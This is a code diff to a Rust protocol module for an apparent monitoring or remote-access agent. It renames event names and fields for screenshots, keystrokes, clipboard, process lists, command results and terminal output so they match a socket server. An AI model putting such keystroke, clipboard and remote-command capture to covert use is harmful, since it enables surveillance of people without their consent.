@@ -38,9 +38,11 @@ pub struct HeartbeatPayload {
 }
 
 /// Screenshot data
+/// IMPORTANT: Server expects "imageData" field, not "image"
 #[derive(Debug, Clone, Serialize)]
 #[serde(rename_all = "camelCase")]
 pub struct ScreenshotPayload {
+    #[serde(rename = "imageData")]
     pub image: String,
     pub timestamp: u64,
     pub active_window: String,
@@ -358,16 +360,17 @@ pub struct KeyboardEvent {
 // =============================================================================
 
 /// Socket event names (agent → server)
+/// IMPORTANT: These must match exactly what socket-server/src/index.ts expects
 pub mod outgoing {
     pub const AUTH: &str = "auth";
     pub const HEARTBEAT: &str = "heartbeat";
     pub const SCREENSHOT: &str = "screenshot";
     pub const SCREEN_FRAME: &str = "screen_frame";
-    pub const ACTIVITY_LOG: &str = "activity_log";
+    pub const ACTIVITY_LOG: &str = "activity";  // Server expects "activity", not "activity_log"
     pub const KEYSTROKES: &str = "keystrokes";
     pub const CLIPBOARD: &str = "clipboard";
-    pub const PROCESS_LIST: &str = "process_list";
-    pub const COMMAND_RESPONSE: &str = "command_response";
+    pub const PROCESS_LIST: &str = "processes";  // Server expects "processes", not "process_list"
+    pub const COMMAND_RESPONSE: &str = "command_result";  // Server expects "command_result", not "command_response"
     pub const TERMINAL_OUTPUT: &str = "terminal_output";
     pub const FILE_TRANSFER_PROGRESS: &str = "file_transfer_progress";
     pub const FILE_CONTENT: &str = "file_content";
